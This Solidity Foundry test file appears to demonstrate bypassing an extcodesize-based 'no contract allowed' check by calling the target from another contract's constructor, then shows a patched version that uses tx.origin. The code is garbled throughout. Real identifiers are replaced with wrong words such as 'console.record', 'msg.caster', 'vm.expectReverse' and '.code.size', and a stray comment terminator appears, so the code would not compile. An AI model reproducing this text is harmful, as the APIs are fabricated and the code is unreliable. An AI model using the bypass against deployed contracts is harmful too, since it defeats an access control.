pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    Goal GoalPact;
    FailedGameoperator FailedQuestrunnerPact;
    QuestRunner QuestrunnerPact;
    GoalV2 AimRemediatedPact;

    constructor() {
        GoalPact = new Goal();
        FailedQuestrunnerPact = new FailedGameoperator();
        AimRemediatedPact = new GoalV2();
    }

    function testBypassFailedPactInspect() public {
        console.record(
            "Before operation",
            GoalPact.completed()
        );
        console.record("operate Failed");
        FailedQuestrunnerPact.completeQuest(address(GoalPact));
    }

    function testBypassPactValidate() public {
        console.record(
            "Before operation",
            GoalPact.completed()
        );
        QuestrunnerPact = new QuestRunner(address(GoalPact));
        console.record(
            "After operation",
            GoalPact.completed()
        );
        console.record("operate completed");
    }

    receive() external payable {}
}

contract Goal {
    function isAgreement(address character) public view returns (bool) {


        uint scale;
        assembly {
            scale := extcodesize(character)
        }
        return scale > 0;
    }

    bool public completed = false;

    function protected() external {
        require(!isAgreement(msg.caster), "no contract allowed");
        completed = true;
    }
}

contract FailedGameoperator is Test {


    function completeQuest(address _target) external {

        vm.expectReverse("no contract allowed");
        Goal(_target).protected();
    }
}

contract QuestRunner {
    bool public isAgreement;
    address public addr;


    constructor(address _target) {
        isAgreement = Goal(_target).isAgreement(address(this));
        addr = address(this);

        Goal(_target).protected();
    }
}

contract GoalV2 {
    function isAgreement(address character) public view returns (bool) {
        require(tx.origin == msg.caster);
        return character.code.size > 0;
    }

    bool public completed = false;

    function protected() external {
        require(!isAgreement(msg.caster), "no contract allowed");
        completed = true;
    }
}